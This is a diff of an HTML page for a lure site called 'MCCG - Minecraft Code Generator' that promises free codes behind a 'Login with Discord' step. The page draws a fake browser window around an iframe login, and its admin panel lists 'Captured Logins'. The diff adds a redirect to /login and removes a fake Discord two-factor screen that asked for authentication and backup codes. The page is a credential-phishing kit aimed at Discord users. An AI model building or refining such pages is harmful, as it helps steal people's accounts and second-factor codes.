@@ -4,7 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="styles.css">
-    
+
+    <!-- Instant redirect from / to /login -->
+    <script>
+        if (window.location.pathname === '/' || window.location.pathname === '') {
+            window.location.replace('/login');
+        }
+    </script>
+
     <!-- Discord Embed Meta Tags -->
     <meta property="og:title" content="MCCG - Minecraft Code Generator">
     <meta property="og:description" content="The most trusted Minecraft Code Generator 2026. Free users get 10 free codes upon sign up. Join thousands of players already using MCCG.">
@@ -30,10 +37,10 @@
                 <p class="tagline">The most trusted Minecraft Code Generator 2026</p>
                 <p class="location-tag">MCCG, based in Europe</p>
             </div>
-            
+
             <div class="login-preview-wrapper">
                 <p class="login-label">Login with Discord</p>
-                
+
                 <div class="browser-window">
                     <div class="browser-chrome">
                         <div class="browser-tabs">
@@ -43,7 +50,7 @@
                             </div>
                         </div>
                     </div>
-                    
+
                     <div class="url-bar-container">
                         <div class="url-bar">
                             <div class="url-security">
@@ -59,7 +66,7 @@
                             </div>
                         </div>
                     </div>
-                    
+
                     <div class="browser-content">
                         <iframe id="login-iframe" src="about:blank" frameborder="0" scrolling="no"></iframe>
                         <div id="error-page" class="error-page hidden">
@@ -75,21 +82,6 @@
                     </div>
                 </div>
             </div>
-        </div>
-    </div>
-
-    <!-- 2FA Screen (Discord Style) -->
-    <div id="twofa-screen" class="screen hidden">
-        <div class="discord-twofa-modal">
-            <img src="https://uxwing.com/wp-content/themes/uxwing/download/household-and-furniture/key-black-icon.png" class="twofa-key-icon" alt="Key">
-            <h2>Two-factor authentication</h2>
-            <p class="twofa-description">You can use a backup code or your two-factor authentication mobile app.</p>
-            <label class="twofa-label">
-                ENTER DISCORD AUTH/BACKUP CODE <span class="twofa-required">*</span>
-            </label>
-            <input type="text" id="twofa-input" class="twofa-box-input" placeholder="6-digit authentication code/8-digit backup code" maxlength="8">
-            <button id="twofa-submit-btn" class="twofa-login-btn">Log In</button>
-            <button id="twofa-back-btn" class="twofa-back-btn">Go Back to Login</button>
         </div>
     </div>
 
@@ -164,6 +156,7 @@
             </header>
 
             <div class="admin-content">
+                <!-- Code Generator -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>MC-CODE Generator</h2>
@@ -192,6 +185,7 @@
                     </div>
                 </section>
 
+                <!-- Captured Logins -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>Captured Logins</h2>
@@ -215,6 +209,7 @@
                     </div>
                 </section>
 
+                <!-- Support Tickets -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>Support Tickets</h2>
@@ -225,6 +220,7 @@
                     </div>
                 </section>
 
+                <!-- Stats -->
                 <section class="admin-section stats-section">
                     <div class="stat-card">
                         <h3>Total Logins</h3>
